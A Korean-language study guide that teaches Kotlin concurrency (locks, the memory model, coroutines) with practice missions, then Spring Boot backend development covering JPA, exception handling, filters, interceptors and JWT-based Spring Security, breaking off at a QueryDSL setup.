## Phase 3: 동시성

> **출처:** JetBrains *Parallel & Concurrent Programming* + *Asynchronous Programming in Kotlin*  
> 스레드 → 락 → JMM → 코루틴 순서로 문제 → 해결책 흐름으로 이해한다.

### 3-A. 스레드 기초

**스레드의 문제점:**
1. **비용이 크다** — 스레드 하나가 OS 자원을 수MB 점유
2. **수가 제한된다** — 스레드 1,000,000개 생성 시 OOM 발생
3. **레이스 컨디션** — 여러 스레드가 같은 데이터에 동시 접근
4. **데드락** — 서로 상대가 잡은 락을 기다리며 영원히 멈춤

```kotlin
// OOM 예시
repeat(1_000_000) {
    thread { Thread.sleep(1000L); println("Hello $it!") }
}
// java.lang.OutOfMemoryError: unable to create native thread
```

### 3-B. 락 메커니즘

**synchronized:**
```kotlin
class Counter {
    private var count = 0

    @Synchronized
    fun increment() { count++ }

    fun incrementWithBlock() {
        synchronized(this) { count++ }
    }
}
```

**ReentrantLock — 더 세밀한 제어:**
```kotlin
val lock = ReentrantLock()

fun criticalSection() {
    lock.withLock {
        // 임계 구역
        count++
    }
}

// 타임아웃 있는 락 획득
if (lock.tryLock(500, TimeUnit.MILLISECONDS)) {
    try {
        doWork()
    } finally {
        lock.unlock()
    }
}

// 디버깅 도우미
lock.holdCount        // 현재 스레드의 락 보유 횟수 (재진입 횟수)
lock.queuedThreads    // 락을 기다리는 스레드 목록
lock.isFair           // 공정(FIFO) 락 여부
```

**Condition (조건 변수):**
```kotlin
val lock = ReentrantLock()
val condition = lock.newCondition()

// 조건이 충족될 때까지 대기 (락을 내부적으로 해제)
fun waitForCondition() {
    lock.withLock {
        while (!conditionMet()) {
            condition.await()   // 락 해제 후 대기
        }
        doWork()
    }
}

// 조건 충족 시 대기 중인 스레드 깨우기
fun signalCondition() {
    lock.withLock {
        setCondition()
        condition.signal()   // 하나만 깨우기
        // condition.signalAll()  // 모두 깨우기
    }
}
```

**ReadWriteLock — 읽기 성능 최적화:**
```kotlin
val rwLock = ReentrantReadWriteLock()

// 여러 스레드가 동시에 읽기 가능
fun readData(): String = rwLock.read {
    data   // 읽기 전용
}

// 쓰기는 단독 실행 (다른 읽기/쓰기 모두 차단)
fun writeData(newData: String) = rwLock.write {
    data = newData
}
```

**`synchronized` vs `ReentrantLock` 선택 기준:**
- 단순한 임계 구역 → `@Synchronized` 또는 `synchronized(this)` (단순, 실수 없음)
- 타임아웃, 조건 변수, 공정성, try-lock → `ReentrantLock`
- 읽기가 쓰기보다 훨씬 많음 → `ReadWriteLock`

### 3-C. Java Memory Model (JMM)

**문제: 가시성과 순서 보장 없음**
```kotlin
// 스레드 A
var ready = false
var result = 0

fun setup() {
    result = 42    // (1)
    ready = true   // (2)
}

// 스레드 B
fun read() {
    while (!ready) {}    // ready를 영원히 못 볼 수 있음 (캐시/레지스터)
    println(result)      // 0을 출력할 수 있음 (재배치 허용)
}
```

**왜 이런 일이 생기는가:**
- CPU 캐시: 메인 메모리에 쓰지 않고 캐시에만 있을 수 있음
- 컴파일러/CPU 재배치: 의미가 같다면 명령 순서를 바꿀 수 있음

**`@Volatile` — 순서와 가시성 모두 보장:**
```kotlin
@Volatile var ready = false
@Volatile var result = 0

// @Volatile 보장:
// 1. 쓰기가 즉시 메인 메모리에 반영
// 2. 읽기가 메인 메모리에서 직접 읽음
// 3. volatile 변수 앞/뒤 코드가 재배치되지 않음
```

**JMM Happens-Before 관계:**
- 프로그램 순서(po): 같은 스레드 내 앞 명령 → 뒷 명령
- reads-from(rf): 쓰기 → 그 쓰기를 읽는 읽기
- `@Volatile`, `synchronized`, 스레드 시작/종료 등이 happens-before 엣지 생성

> **DRF(Data-Race Free) 프로그램:** 모든 공유 변수 접근에 happens-before가 있으면 순차 일관성(Sequential Consistency) 보장됨.

### 3-D. 동시성 컬렉션

**블로킹 컬렉션 (생산자-소비자 패턴):**

| 컬렉션 | 특징 |
|---|---|
| `SynchronousQueue` | 버퍼 없음, 생산자-소비자가 동시에 만나야 전달 (rendezvous) |
| `ArrayBlockingQueue(n)` | 고정 크기 버퍼, 꽉 차면 put 블로킹 |
| `LinkedBlockingQueue` | 무제한(또는 크기 지정) 버퍼 |
| `PriorityBlockingQueue` | 우선순위 큐 + 블로킹 |

```kotlin
val queue = ArrayBlockingQueue<Task>(100)

// 생산자 스레드
thread { queue.put(Task("work")) }   // 꽉 차면 대기

// 소비자 스레드
thread { val task = queue.take() }   // 비어있으면 대기
```

**비블로킹 컬렉션 (Lock-Free):**

| 컬렉션 | 특징 |
|---|---|
| `ConcurrentLinkedQueue` | Lock-free FIFO 큐 |
| `ConcurrentLinkedDequeue` | Lock-free 양방향 큐 |
| `ConcurrentHashMap` | 세그먼트 단위 락, 읽기는 락 없음 |
| `ConcurrentSkipListMap` | 정렬된 동시 맵 |

```kotlin
val map = ConcurrentHashMap<String, Int>()
map.putIfAbsent("key", 1)              // 없을 때만 삽입 (atomic)
map.computeIfAbsent("key") { 0 }      // 없을 때 계산해서 삽입
map.merge("key", 1) { old, new -> old + new }  // atomic 업데이트
```

**동기화 프리미티브:**

```kotlin
// Exchanger: 두 스레드가 데이터를 서로 교환 (블로킹)
val exchanger = Exchanger<String>()
thread { val received = exchanger.exchange("from-A") }
thread { val received = exchanger.exchange("from-B") }

// Phaser: 여러 스레드의 페이즈(단계) 동기화 (CyclicBarrier의 진화판)
val phaser = Phaser(3)   // 3개 스레드
repeat(3) {
    thread {
        doPhase1()
        phaser.arriveAndAwaitAdvance()   // 3개 모두 완료까지 대기
        doPhase2()
    }
}
```

### 3-E. 코루틴 — 비동기의 해결책

**왜 코루틴인가:**
```kotlin
// 스레드: 블로킹 I/O 중 스레드 낭비
fun fetchData(): String {
    return httpClient.get("...")   // 스레드 블로킹 (수십ms~수초)
}

// 코루틴: 스레드 해방, 다른 작업 수행
suspend fun fetchData(): String {
    return httpClient.get("...")   // 스레드 해방, 코루틴만 대기
}
```

**suspend 함수 내부 동작:**
- `suspend` 키워드 → 컴파일러가 `Continuation<T>` 콜백으로 변환
- 일시 정지 지점(suspension point)마다 상태 저장 → 재개 시 복원

**코루틴 빌더:**

| 빌더 | 반환 타입 | 설명 |
|---|---|---|
| `launch` | `Job` | fire-and-forget, 결과 없음 |
| `async` | `Deferred<T>` | 결과를 `await()`로 수령 |
| `runBlocking` | `T` | 현재 스레드 블로킹 (main/test 전용) |
| `produce` | `ReceiveChannel<E>` | 채널로 값 방출 |

```kotlin
// launch
val job = launch { doWork() }
job.join()   // 완료 대기

// async — 병렬 실행
val deferred1 = async { fetchUser() }
val deferred2 = async { fetchOrders() }
val user = deferred1.await()
val orders = deferred2.await()

// 기본은 순차 실행 — 병렬은 명시적으로
val a = fetchUser()    // 완료 후
val b = fetchOrders()  // 실행됨
```

**Dispatchers:**

| Dispatcher | 용도 |
|---|---|
| `Dispatchers.Main` | UI 스레드 (Android) |
| `Dispatchers.IO` | 파일, 네트워크 I/O |
| `Dispatchers.Default` | CPU 집약적 연산 |
| `Dispatchers.Unconfined` | 테스트/특수 용도 |

```kotlin
suspend fun processData() {
    val raw = withContext(Dispatchers.IO) { readFile() }      // IO 스레드
    val result = withContext(Dispatchers.Default) { parse(raw) }  // 연산 스레드
    updateUI(result)   // 원래 스레드로 복귀
}
```

**CoroutineScope와 구조화된 동시성:**
```kotlin
// 잘못된 방법: GlobalScope는 부모 없음 → 누수 가능
GlobalScope.launch { download() }

// 올바른 방법: coroutineScope로 구조화
suspend fun processAll(refs: List<Ref>) = coroutineScope {
    for (ref in refs) {
        launch { download(ref) }
    }
    // 모든 자식 완료 전까지 여기서 기다림
}

// 컨텍스트 조합
val scope = CoroutineScope(
    Dispatchers.Default
    + SupervisorJob()
    + CoroutineName("ProcessScope")
    + CoroutineExceptionHandler { _, e -> log.error("Unhandled", e) }
)
```

**예외 전파:**
```
일반 Job:
  자식 예외 → 부모로 전파 → 형제 코루틴 취소 → 루트까지 전파

SupervisorJob:
  자식 예외 → 해당 자식만 취소, 다른 자식은 계속 실행
```

**코루틴 취소 (Cooperative Cancellation):**
```kotlin
val job = launch {
    repeat(1_000) { i ->
        delay(100L)                  // suspend point — 취소 감지
        if (!isActive) return@launch // 명시적 체크
        doWork(i)
    }
}
job.cancelAndJoin()

// cleanup이 필요한 경우
try {
    repeat(1_000) { delay(100L) }
} finally {
    withContext(NonCancellable) {
        releaseResource()   // 취소 중에도 실행됨
    }
}
```

**Mutex — 코루틴 안전 락:**
```kotlin
val mutex = Mutex()
var counter = 0

// ReentrantLock은 코루틴에서 unsafe (resume이 다른 스레드에서 일어날 수 있음)
// 코루틴에서는 반드시 Mutex 사용
suspend fun increment() {
    mutex.withLock { counter++ }
}
```

**Channels — 코루틴 간 통신:**
```kotlin
val channel = Channel<Int>()

launch {
    for (x in 1..5) channel.send(x * x)
    channel.close()
}

for (value in channel) println(value)   // 1, 4, 9, 16, 25

// Fan-out: 하나의 채널 → 여러 소비자
// Fan-in: 여러 생산자 → 하나의 채널
```

---

## Phase 3 미션

### 미션 4: RSS리더

**목표:** HTTP 통신, XML 파싱, 주기 실행, 병렬 fetch

**기능 요구사항:**
- 기술 블로그 RSS 가져와 최신 게시글 목록 구성
- 작성 날짜 기준 내림차순 정렬, 최대 10개 출력
- 키워드 입력 시 제목 필터링
- 10분마다 RSS 피드 자동 확인 (구독)
- 새 게시글 있으면 콘솔 알림

**핵심 코드 패턴:**
```kotlin
suspend fun fetchAllFeeds(urls: List<String>): List<Article> = coroutineScope {
    urls.map { url ->
        async(Dispatchers.IO) { fetchFeed(url) }
    }.awaitAll().flatten()
     .sortedByDescending { it.publishedAt }
     .take(10)
}

// 구독: 10분마다 확인
launch {
    while (isActive) {
        checkForNewArticles()
        delay(10.minutes)
    }
}
```

---

### 미션 5: 코루틴 레이싱

**목표:** 코루틴 실전 적용, 구조화된 동시성, 취소

**기능 요구사항:**
- 자동차 이름 입력 + 목표 거리 입력
- 각 자동차를 **코루틴**으로 비동기 제어
- 0~500ms 랜덤 딜레이 후 한 칸 전진
- 실시간 위치 출력
- 우승자 발생 시 나머지 코루틴 전부 취소

```kotlin
suspend fun race(cars: List<String>, targetDistance: Int) = coroutineScope {
    val jobs = cars.map { carName ->
        launch {
            var position = 0
            while (isActive && position < targetDistance) {
                delay(Random.nextLong(500))
                position++
                println("$carName: ${"=".repeat(position)}")
                if (position >= targetDistance) {
                    println("$carName 우승!")
                    coroutineContext.cancelChildren()
                }
            }
        }
    }
    jobs.forEach { it.join() }
}
```

---

## Phase 4: 백엔드 개발

> **출처:** JetBrains *Backend Development Basics* 슬라이드  
> Spring Boot + JPA로 실전 서버 개발을 체험한다.

### 4-A. 네트워크 기초

**TCP/IP 핵심:**
- IP 주소: 네트워크 상의 컴퓨터 식별자
- 포트: 같은 컴퓨터 내 여러 프로세스 구분
- TCP: 연결 지향(3-way handshake), 순서 보장, 재전송 보장

**HTTP 프로토콜 — 텍스트 기반:**
```
요청:
GET /users/1 HTTP/1.1
Host: api.example.com
Accept: application/json

응답:
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 1, "name": "Arnold"}
```

**HTTP 메서드와 멱등성:**

| 메서드 | 의미 | 멱등성 | 안전성 |
|---|---|---|---|
| `GET` | 조회 | O | O |
| `POST` | 생성 | X | X |
| `PUT` | 전체 수정 | O | X |
| `PATCH` | 부분 수정 | O | X |
| `DELETE` | 삭제 | O | X |

**HTTP 상태 코드:**

| 범위 | 의미 | 예시 |
|---|---|---|
| 2xx | 성공 | 200 OK, 201 Created, 204 No Content |
| 3xx | 리다이렉션 | 301 Moved, 304 Not Modified |
| 4xx | 클라이언트 에러 | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict |
| 5xx | 서버 에러 | 500 Internal Server Error, 503 Service Unavailable |

**REST 핵심 원칙:**
- **자원(Resource)** 중심 URL: `/users/1`, `/posts/42/comments`
- **HTTP 메서드**로 동사 표현: `GET /users` vs `POST /users`
- **무상태(Stateless)**: 서버가 클라이언트 상태를 저장하지 않음

### 4-B. Spring Boot 기초

**의존성 (build.gradle.kts):**
```kotlin
plugins {
    kotlin("jvm") version "2.1.0"
    kotlin("plugin.spring") version "2.1.0"
    id("org.springframework.boot") version "3.3.0"
    id("io.spring.dependency-management") version "1.1.5"
}

dependencies {
    implementation("org.springframework.boot:spring-boot-starter-web")
    implementation("org.springframework.boot:spring-boot-starter-data-jpa")
    implementation("com.fasterxml.jackson.module:jackson-module-kotlin")
    runtimeOnly("com.h2database:h2")
    testImplementation("org.springframework.boot:spring-boot-starter-test")
}
```

**기본 구조:**
```kotlin
@SpringBootApplication
class Application

fun main(args: Array<String>) {
    runApplication<Application>(*args)
}
```

**Controller — HTTP 요청 처리:**
```kotlin
@RestController
@RequestMapping("/v1/users")
class UserController(
    private val userService: UserService
) {
    @GetMapping("/{id}")
    fun getUser(@PathVariable id: Long): UserResponse =
        userService.findById(id)

    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    fun createUser(@RequestBody @Valid request: CreateUserRequest): UserResponse =
        userService.create(request)

    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    fun deleteUser(@PathVariable id: Long) =
        userService.delete(id)
}
```

**Service — 비즈니스 로직:**
```kotlin
@Service
@Transactional(readOnly = true)
class UserService(
    private val userRepository: UserRepository
) {
    fun findById(id: Long): UserResponse =
        userRepository.findByIdOrNull(id)
            ?.toResponse()
            ?: throw UserNotFoundException(id)

    @Transactional
    fun create(request: CreateUserRequest): UserResponse =
        userRepository.save(request.toEntity()).toResponse()
}
```

**의존성 주입(DI) 원칙:**
- 생성자 주입 우선 (`@Autowired` 불필요 — 코틀린에서는 단일 생성자면 자동)
- `@Service`, `@Repository`, `@Component` 등으로 Bean 등록
- 테스트 시 Mock으로 교체 가능

### 4-C. Spring Data JPA

**Entity:**
```kotlin
@Entity
@Table(name = "users")
class User(
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    val id: Long = 0,

    @Column(nullable = false, length = 50)
    val name: String,

    @Column(nullable = false, unique = true)
    val email: String,

    @CreationTimestamp
    val createdAt: LocalDateTime = LocalDateTime.now()
)
```

**Repository:**
```kotlin
interface UserRepository : JpaRepository<User, Long> {
    fun findByEmail(email: String): User?
    fun findAllByNameContaining(keyword: String): List<User>

    // JPQL
    @Query("SELECT u FROM User u WHERE u.createdAt > :since")
    fun findRecentUsers(@Param("since") since: LocalDateTime): List<User>
}
```

**N+1 문제와 해결:**
```kotlin
// 문제: order 조회 시 각 order.user를 N번 추가 조회
@Entity
class Order(
    @ManyToOne(fetch = FetchType.LAZY)
    val user: User
)

// 해결: fetch join 또는 EntityGraph
@Query("SELECT o FROM Order o JOIN FETCH o.user WHERE o.status = :status")
fun findWithUser(@Param("status") status: OrderStatus): List<Order>
```

**트랜잭션:**
```kotlin
@Service
class TransferService(
    private val accountRepository: AccountRepository
) {
    @Transactional
    fun transfer(fromId: Long, toId: Long, amount: Int) {
        val from = accountRepository.findByIdOrNull(fromId) ?: throw AccountNotFoundException()
        val to = accountRepository.findByIdOrNull(toId) ?: throw AccountNotFoundException()

        require(from.balance >= amount) { "잔액 부족" }

        // 두 업데이트가 하나의 트랜잭션 — 하나 실패 시 전체 롤백
        accountRepository.save(from.copy(balance = from.balance - amount))
        accountRepository.save(to.copy(balance = to.balance + amount))
    }
}
```

---

### 4-D. 예외 처리 & Validation

> 실전에서 API 품질은 예외 처리 일관성에서 드러난다.  
> 아래 패턴은 `test-drive-portal-api`에서 실제 사용 중인 구조다.

**예외 계층 설계:**

```kotlin
// 1. 에러 코드 enum — HTTP 상태 + 메시지를 한 곳에서 관리
enum class ErrorCode(
    val status: HttpStatus,
    val message: String,
) {
    // 인증/인가
    INVALID_CREDENTIALS(HttpStatus.UNAUTHORIZED, "이메일 또는 비밀번호가 올바르지 않습니다"),
    INVALID_TOKEN(HttpStatus.UNAUTHORIZED, "유효하지 않은 토큰입니다"),
    EXPIRED_TOKEN(HttpStatus.UNAUTHORIZED, "만료된 토큰입니다"),

    // 리소스
    USER_NOT_FOUND(HttpStatus.NOT_FOUND, "존재하지 않는 사용자입니다"),
    PRODUCT_NOT_FOUND(HttpStatus.NOT_FOUND, "존재하지 않는 상품입니다"),

    // 비즈니스
    DUPLICATE_EMAIL(HttpStatus.BAD_REQUEST, "이미 등록된 이메일입니다"),
    INSUFFICIENT_BALANCE(HttpStatus.BAD_REQUEST, "잔액이 부족합니다"),

    // 서버
    INTERNAL_ERROR(HttpStatus.INTERNAL_SERVER_ERROR, "서버 내부 오류가 발생했습니다"),
}

// 2. 단일 비즈니스 예외 클래스 — ErrorCode가 모든 맥락을 포함
class ApiException(
    val errorCode: ErrorCode,
    override val message: String = errorCode.message,
    cause: Throwable? = null,
) : RuntimeException(message, cause)
```

**왜 이 구조인가:**
- `UserNotFoundException`, `ProductNotFoundException` 같은 예외 클래스를 수십 개 만들 필요 없음
- `ErrorCode`만 추가하면 새 에러 상황 대응 완료
- 에러 코드 목록이 곧 API 계약 문서 역할

**GlobalExceptionHandler:**

```kotlin
@RestControllerAdvice
class GlobalExceptionHandler {

    private val log = LoggerFactory.getLogger(this::class.java)

    data class ErrorResponse(
        val statusCode: Int,
        val error: String,
        val message: String,
    )

    // 비즈니스 예외 — warn 레벨 (운영 노이즈 최소화)
    @ExceptionHandler(ApiException::class)
    fun handleApiException(e: ApiException): ResponseEntity<ErrorResponse> {
        log.warn("API Exception: ${e.errorCode} - ${e.message}")
        return ResponseEntity
            .status(e.errorCode.status)
            .body(ErrorResponse(
                statusCode = e.errorCode.status.value(),
                error = e.errorCode.name,
                message = e.message,
            ))
    }

    // @Valid 검증 실패 — 400 Bad Request
    @ExceptionHandler(MethodArgumentNotValidException::class)
    fun handleValidation(e: MethodArgumentNotValidException): ResponseEntity<ErrorResponse> {
        val message = e.bindingResult.fieldErrors
            .joinToString(", ") { "${it.field}: ${it.defaultMessage}" }
        return ResponseEntity.badRequest().body(
            ErrorResponse(400, "VALIDATION_FAILED", message)
        )
    }

    // 필수 파라미터 누락 — 400 Bad Request
    @ExceptionHandler(MissingServletRequestParameterException::class)
    fun handleMissingParam(e: MissingServletRequestParameterException): ResponseEntity<ErrorResponse> =
        ResponseEntity.badRequest().body(
            ErrorResponse(400, "MISSING_PARAMETER", "${e.parameterName} 파라미터가 필요합니다")
        )

    // 예상치 못한 예외 — error 레벨 (즉시 알림 필요)
    @ExceptionHandler(Exception::class)
    fun handleGeneral(e: Exception): ResponseEntity<ErrorResponse> {
        log.error("Unhandled exception", e)
        return ResponseEntity.internalServerError().body(
            ErrorResponse(500, "INTERNAL_ERROR", "서버 내부 오류가 발생했습니다")
        )
    }
}
```

**Validation — DTO에 제약 선언:**

```kotlin
// Kotlin에서는 @field: 접두어 필수 (프로퍼티가 아닌 필드에 적용)
data class SignupRequest(
    @field:NotBlank(message = "이메일은 필수입니다")
    @field:Email(message = "이메일 형식이 올바르지 않습니다")
    val email: String,

    @field:Size(min = 8, message = "비밀번호는 8자 이상이어야 합니다")
    val password: String,

    @field:NotBlank
    val name: String,

    @field:Pattern(regexp = "^01[016789]-\\d{3,4}-\\d{4}$", message = "올바른 전화번호 형식이 아닙니다")
    val phone: String,
)

// Controller에서 @Valid로 활성화
@PostMapping("/signup")
@ResponseStatus(HttpStatus.CREATED)
fun signup(@Valid @RequestBody request: SignupRequest): TokenResponse =
    authService.signup(request)
```

**커스텀 Validator (복잡한 비즈니스 규칙):**

```kotlin
// 1. 어노테이션 정의
@Target(AnnotationTarget.FIELD)
@Retention(AnnotationRetention.RUNTIME)
@Constraint(validatedBy = [FutureDateValidator::class])
annotation class FutureDate(
    val message: String = "날짜는 현재 이후여야 합니다",
    val groups: Array<KClass<*>> = [],
    val payload: Array<KClass<out Payload>> = [],
)

// 2. 검증 로직
class FutureDateValidator : ConstraintValidator<FutureDate, LocalDateTime> {
    override fun isValid(value: LocalDateTime?, context: ConstraintValidatorContext): Boolean =
        value == null || value.isAfter(LocalDateTime.now())
}

// 3. 사용
data class EventCreateRequest(
    @field:FutureDate
    val startsAt: LocalDateTime,
)
```

**에러 응답 형식 표준화 원칙:**
- 항상 동일한 JSON 구조 반환 (클라이언트가 파싱 가능)
- HTTP 상태 코드와 body의 `statusCode` 일치
- 운영 로그: 비즈니스 예외 = warn, 시스템 예외 = error

---

### 4-E. Filter / Interceptor / AOP

> 세 가지는 모두 "횡단 관심사(Cross-Cutting Concern)"를 처리하지만 실행 위치와 권한이 다르다.

**실행 위치 비교:**

```
HTTP 요청
    │
    ▼
[Filter]                ← Servlet 레벨, Spring 컨텍스트 없이도 동작
    │                     (인증 토큰 추출, 요청 로깅, CORS)
    ▼
[DispatcherServlet]
    │
    ▼
[Interceptor]           ← Spring MVC 레벨, HandlerMethod 정보 접근 가능
    │                     (인가 체크, 요청별 메타데이터 설정)
    ▼
[Controller]
    │
    ▼
[AOP]                   ← 메서드 레벨, 빈(Bean)이면 어디서든
    │                     (트랜잭션, 캐싱, 감사 로그)
    ▼
[Service / Repository]
```

**Filter (OncePerRequestFilter):**

```kotlin
// 요청당 정확히 한 번만 실행 보장
@Component
@Order(1)
class RequestLoggingFilter : OncePerRequestFilter() {

    private val log = LoggerFactory.getLogger(this::class.java)

    override fun doFilterInternal(
        request: HttpServletRequest,
        response: HttpServletResponse,
        filterChain: FilterChain,
    ) {
        val startTime = System.currentTimeMillis()
        val requestId = UUID.randomUUID().toString().take(8)

        // MDC: 스레드 로컬 기반 로그 컨텍스트 (로그에 요청 ID 자동 포함)
        MDC.put("requestId", requestId)
        MDC.put("method", request.method)
        MDC.put("uri", request.requestURI)

        try {
            log.info("→ ${request.method} ${request.requestURI}")
            filterChain.doFilter(request, response)
            log.info("← ${response.status} (${System.currentTimeMillis() - startTime}ms)")
        } finally {
            MDC.clear()
        }
    }

    // 특정 경로 필터 제외
    override fun shouldNotFilter(request: HttpServletRequest): Boolean =
        request.requestURI.startsWith("/health")
}
```

**JWT 인증 필터 (실제 프로젝트 패턴):**

```kotlin
@Component
class JwtAuthenticationFilter(
    private val jwtTokenProvider: JwtTokenProvider,
    private val userRepository: UserRepository,
) : OncePerRequestFilter() {

    override fun doFilterInternal(
        request: HttpServletRequest,
        response: HttpServletResponse,
        filterChain: FilterChain,
    ) {
        resolveToken(request)
            ?.let { token -> jwtTokenProvider.validateAndGetUserId(token) }
            ?.let { userId -> userRepository.findByIdOrNull(userId) }
            ?.also { user ->
                SecurityContextHolder.getContext().authentication =
                    UsernamePasswordAuthenticationToken(user, null, emptyList())
            }
        filterChain.doFilter(request, response)
    }

    private fun resolveToken(request: HttpServletRequest): String? =
        request.getHeader("Authorization")
            ?.takeIf { it.startsWith("Bearer ") }
            ?.substring(7)
}
```

**Interceptor (HandlerInterceptor):**

```kotlin
@Component
class AdminAuthInterceptor : HandlerInterceptor {

    // 컨트롤러 실행 전 — false 반환 시 요청 중단
    override fun preHandle(
        request: HttpServletRequest,
        response: HttpServletResponse,
        handler: Any,
    ): Boolean {
        // 어노테이션 기반 접근 제어
        val method = (handler as? HandlerMethod) ?: return true
        val requireAdmin = method.getMethodAnnotation(RequireAdmin::class.java)
            ?: method.beanType.getAnnotation(RequireAdmin::class.java)
            ?: return true

        val auth = SecurityContextHolder.getContext().authentication
        if (auth?.principal !is AdminUser) {
            response.sendError(HttpServletResponse.SC_FORBIDDEN, "관리자 권한이 필요합니다")
            return false
        }
        return true
    }

    // 컨트롤러 실행 후, 뷰 렌더링 전
    override fun postHandle(
        request: HttpServletRequest,
        response: HttpServletResponse,
        handler: Any,
        modelAndView: ModelAndView?,
    ) { }

    // 뷰 렌더링 후 (예외 발생 여부 무관하게 항상 실행)
    override fun afterCompletion(
        request: HttpServletRequest,
        response: HttpServletResponse,
        handler: Any,
        ex: Exception?,
    ) {
        ex?.let { log.error("Request failed: ${request.requestURI}", it) }
    }
}

// 인터셉터 등록
@Configuration
class WebMvcConfig(
    private val adminAuthInterceptor: AdminAuthInterceptor,
) : WebMvcConfigurer {
    override fun addInterceptors(registry: InterceptorRegistry) {
        registry.addInterceptor(adminAuthInterceptor)
            .addPathPatterns("/v1/admin/**")
    }
}
```

**AOP (@Aspect) — 메서드 레벨 횡단 관심사:**

```kotlin
@Aspect
@Component
class AuditLogAspect {

    private val log = LoggerFactory.getLogger(this::class.java)

    // @AuditLog 어노테이션이 붙은 모든 메서드에 적용
    @Around("@annotation(auditLog)")
    fun logAudit(joinPoint: ProceedingJoinPoint, auditLog: AuditLog): Any? {
        val method = joinPoint.signature.name
        val args = joinPoint.args
        val start = System.currentTimeMillis()

        return try {
            val result = joinPoint.proceed()
            log.info("AUDIT: $method(${args.joinToString()}) → success (${System.currentTimeMillis() - start}ms)")
            result
        } catch (e: Exception) {
            log.warn("AUDIT: $method(${args.joinToString()}) → failed: ${e.message}")
            throw e
        }
    }

    // 성능 모니터링: 실행 시간 경고
    @Around("execution(* kr.socar.*.service.*Service.*(..))")
    fun monitorPerformance(joinPoint: ProceedingJoinPoint): Any? {
        val start = System.currentTimeMillis()
        val result = joinPoint.proceed()
        val elapsed = System.currentTimeMillis() - start
        if (elapsed > 1000) {
            log.warn("SLOW: ${joinPoint.signature} took ${elapsed}ms")
        }
        return result
    }
}
```

**결정 기준:**

| 상황 | 선택 | 이유 |
|---|---|---|
| JWT 토큰 파싱, 요청 로깅 | Filter | 가장 먼저 실행, Spring 컨텍스트 불필요 |
| 역할(Role) 검사, 어노테이션 기반 접근 제어 | Interceptor | HandlerMethod 정보 필요 |
| 감사 로그, 성능 측정, 캐싱 | AOP | 특정 클래스/메서드 패턴 타게팅 |
| @Transactional, @Cacheable | AOP (Spring 내장) | 이미 AOP로 구현됨 |

---

### 4-F. Spring Security & JWT

**JWT 토큰 구조:**

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiVVNFUiIsImlhdCI6...}
└── Header (알고리즘)  └── Payload (클레임)                          └── Signature
```

**JwtTokenProvider:**

```kotlin
@Component
class JwtTokenProvider(private val jwtProperties: JwtProperties) {

    private val secretKey: SecretKey by lazy {
        Keys.hmacShaKeyFor(jwtProperties.secret.toByteArray())
    }

    fun generateAccessToken(userId: Long, role: String): String =
        Jwts.builder()
            .subject(userId.toString())
            .claim("role", role)
            .issuedAt(Date())
            .expiration(Date(System.currentTimeMillis() + parseExpiry(jwtProperties.accessExpiry)))
            .signWith(secretKey)
            .compact()

    fun generateRefreshToken(userId: Long): String =
        Jwts.builder()
            .subject(userId.toString())
            .issuedAt(Date())
            .expiration(Date(System.currentTimeMillis() + parseExpiry(jwtProperties.refreshExpiry)))
            .signWith(secretKey)
            .compact()

    fun validateAndGetUserId(token: String): Long? = runCatching {
        Jwts.parser()
            .verifyWith(secretKey)
            .build()
            .parseSignedClaims(token)
            .payload
            .subject
            .toLong()
    }.getOrNull()

    private fun parseExpiry(expiry: String): Long = when {
        expiry.endsWith("h") -> expiry.dropLast(1).toLong() * 3600_000
        expiry.endsWith("d") -> expiry.dropLast(1).toLong() * 86400_000
        else -> expiry.toLong()
    }
}
```

**다중 SecurityFilterChain (실제 프로젝트 패턴):**

```kotlin
@Configuration
@EnableWebSecurity
@EnableMethodSecurity          // @PreAuthorize 활성화
class SecurityConfig(
    private val customerJwtFilter: JwtAuthenticationFilter,
    private val partnerJwtFilter: PartnerJwtAuthenticationFilter,
    private val environment: Environment,
) {
    // @Order: 낮을수록 먼저 평가 — URL 패턴이 겹치면 먼저 매칭된  체인이 처리

    @Bean @Order(1)
    fun partnerChain(http: HttpSecurity): SecurityFilterChain = http
        .securityMatcher("/v1/partner-admin/**")
        .stateless()
        .authorizeHttpRequests { auth ->
            auth.requestMatchers(POST, "/v1/partner-admin/auth/login").permitAll()
                .anyRequest().authenticated()
        }
        .addFilterBefore(partnerJwtFilter, UsernamePasswordAuthenticationFilter::class.java)
        .build()

    @Bean @Order(2)
    fun customerChain(http: HttpSecurity): SecurityFilterChain {
        val isProd = environment.activeProfiles.contains("prod")
        return http
            .stateless()
            .authorizeHttpRequests { auth ->
                auth.requestMatchers("/health/**").permitAll()
                    .requestMatchers("/swagger-ui/**", "/v3/api-docs/**")
                        .run { if (isProd) denyAll() else permitAll() }
                    .requestMatchers(POST, "/v1/auth/login", "/v1/auth/signup").permitAll()
                    .anyRequest().authenticated()
            }
            .addFilterBefore(customerJwtFilter, UsernamePasswordAuthenticationFilter::class.java)
            .build()
    }

    @Bean
    fun passwordEncoder(): PasswordEncoder = BCryptPasswordEncoder(10)

    // 확장 함수로 공통 설정 추출
    private fun HttpSecurity.stateless(): HttpSecurity = this
        .cors { }
        .csrf { it.disable() }
        .sessionManagement { it.sessionCreationPolicy(SessionCreationPolicy.STATELESS) }
}
```

**메서드 레벨 인가 (@PreAuthorize):**

```kotlin
@RestController
class AdminController {

    @GetMapping("/v1/admin/users")
    @PreAuthorize("hasRole('ADMIN')")
    fun getUsers(): List<UserResponse> = ...

    @DeleteMapping("/v1/admin/users/{id}")
    @PreAuthorize("hasRole('SUPER_ADMIN') or @userService.isOwner(#id, principal)")
    fun deleteUser(@PathVariable id: Long): Unit = ...
}
```

**Refresh Token 전략:**

```
Access Token  (짧게: 1~3시간)  — 매 요청마다 사용
Refresh Token (길게: 7~30일)   — Access Token 재발급용, DB에 저장

갱신 흐름:
1. Access Token 만료 → 401 응답
2. 클라이언트가 Refresh Token으로 /auth/refresh 요청
3. Refresh Token 유효성 검증 (DB 조회)
4. 새 Access Token + 새 Refresh Token 발급 (Rotation)
5. 기존 Refresh Token DB에서 무효화
```

---

### 4-G. Spring Data JPA 심화

**QueryDSL 설정:**

```kotlin
// build.gradle.kts
plugins {
    kotlin("kapt") version "2.1.0"
}

dependencies {
